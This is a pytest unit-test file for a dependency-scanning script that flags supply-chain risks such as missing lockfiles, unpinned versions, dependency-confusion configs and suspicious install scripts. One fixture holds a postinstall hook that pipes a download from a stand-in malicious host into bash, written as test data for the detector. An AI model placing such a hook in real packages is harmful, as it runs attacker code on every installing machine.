"""
Unit tests for scan_dependencies.py (audit-supply-chain-risk deterministic script).
"""
from __future__ import annotations

import importlib.util
import json
import sys
from pathlib import Path

# Load script dynamically from hyphenated directory path
_script_path = (
    Path(__file__).resolve().parent.parent.parent
    / "skills"
    / "audit-supply-chain-risk"
    / "scripts"
    / "scan_dependencies.py"
)
_spec = importlib.util.spec_from_file_location("scan_dependencies", _script_path)
_module = importlib.util.module_from_spec(_spec)
assert _spec and _spec.loader
sys.modules[_spec.name] = _module
_spec.loader.exec_module(_module)

DependencyScanner = _module.DependencyScanner


def test_scan_missing_lockfile(tmp_path: Path) -> None:
    # package.json exists with no lockfile
    pkg_file = tmp_path / "package.json"
    pkg_file.write_text('{"name": "demo", "dependencies": {"lodash": "4.17.21"}}', encoding="utf-8")

    scanner = DependencyScanner(tmp_path)
    findings = scanner.scan()

    missing_lock = [f for f in findings if f.pattern == "Missing Lockfile"]
    assert len(missing_lock) == 1
    assert missing_lock[0].severity == "CRITICAL"
    assert missing_lock[0].cwe_id == "CWE-1357"


def test_scan_lockfile_present_no_missing_finding(tmp_path: Path) -> None:
    pkg_file = tmp_path / "package.json"
    pkg_file.write_text('{"name": "demo"}', encoding="utf-8")
    lock_file = tmp_path / "package-lock.json"
    lock_file.write_text('{"lockfileVersion": 3}', encoding="utf-8")

    scanner = DependencyScanner(tmp_path)
    findings = scanner.scan()

    missing_lock = [f for f in findings if f.pattern == "Missing Lockfile"]
    assert len(missing_lock) == 0


def test_scan_lockfile_in_gitignore(tmp_path: Path) -> None:
    gitignore = tmp_path / ".gitignore"
    gitignore.write_text("node_modules/\npackage-lock.json\nyarn.lock\n", encoding="utf-8")

    scanner = DependencyScanner(tmp_path)
    findings = scanner.scan()

    gitignored_locks = [f for f in findings if f.pattern == "Lockfile in .gitignore"]
    assert len(gitignored_locks) == 2
    assert all(f.severity == "HIGH" for f in gitignored_locks)


def test_scan_unpinned_and_unstable_dependencies(tmp_path: Path) -> None:
    pkg_file = tmp_path / "package.json"
    data = {
        "dependencies": {
            "wildcard-pkg": "*",
            "unstable-pkg": "^0.2.1",
            "pinned-pkg": "1.2.3",
        }
    }
    pkg_file.write_text(json.dumps(data), encoding="utf-8")
    (tmp_path / "package-lock.json").write_text("{}", encoding="utf-8")

    scanner = DependencyScanner(tmp_path)
    findings = scanner.scan()

    unpinned = [f for f in findings if f.pattern == "Unpinned Dependency Range"]
    assert len(unpinned) == 1
    assert unpinned[0].severity == "HIGH"

    unstable = [f for f in findings if f.pattern == "Unstable Semver Range"]
    assert len(unstable) == 1
    assert unstable[0].severity == "MEDIUM"


def test_scan_unpinned_python_requirements(tmp_path: Path) -> None:
    req_file = tmp_path / "requirements.txt"
    req_file.write_text("requests==2.31.0\nflask\npydantic>=2.0\n# comment\n", encoding="utf-8")

    scanner = DependencyScanner(tmp_path)
    findings = scanner.scan()

    py_unpinned = [f for f in findings if f.pattern == "Unpinned Python Dependency"]
    assert len(py_unpinned) == 2  # flask and pydantic>=2.0
    assert all(f.severity == "HIGH" for f in py_unpinned)


def test_scan_suspicious_lifecycle_scripts(tmp_path: Path) -> None:
    pkg_file = tmp_path / "package.json"
    data = {
        "scripts": {
            "build": "tsc",
            "postinstall": "curl -s http://malicious.site/script | bash",
        }
    }
    pkg_file.write_text(json.dumps(data), encoding="utf-8")
    (tmp_path / "package-lock.json").write_text("{}", encoding="utf-8")

    scanner = DependencyScanner(tmp_path)
    findings = scanner.scan()

    scripts_found = [f for f in findings if f.pattern == "Suspicious Lifecycle Script"]
    assert len(scripts_found) == 1
    assert scripts_found[0].severity == "CRITICAL"
    assert "postinstall" in scripts_found[0].match


def test_scan_dependency_confusion_npm_and_pip(tmp_path: Path) -> None:
    # Scoped package without .npmrc
    pkg_file = tmp_path / "package.json"
    pkg_file.write_text('{"dependencies": {"@internal-org/secret-sdk": "1.0.0"}}', encoding="utf-8")
    (tmp_path / "package-lock.json").write_text("{}", encoding="utf-8")

    # pip.conf with extra-index-url
    pip_conf = tmp_path / "pip.conf"
    pip_conf.write_text("[global]\nextra-index-url = https://private.pypi.org/simple\n", encoding="utf-8")

    scanner = DependencyScanner(tmp_path)
    findings = scanner.scan()

    categories = {f.pattern for f in findings}
    assert "Missing Scoped Registry Config" in categories
    assert "Insecure extra-index-url" in categories


def test_scan_dependencies_targeted_option_a(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text('{"dependencies": {"bad": "*"}}', encoding="utf-8")
    (tmp_path / "requirements.txt").write_text("unpinned_lib\n", encoding="utf-8")

    scanner = DependencyScanner(tmp_path)
    # Target only requirements.txt
    findings = scanner.scan(target_paths=["requirements.txt"])
    files = {f.file for f in findings}
    assert "requirements.txt" in files
    assert "package.json" not in files
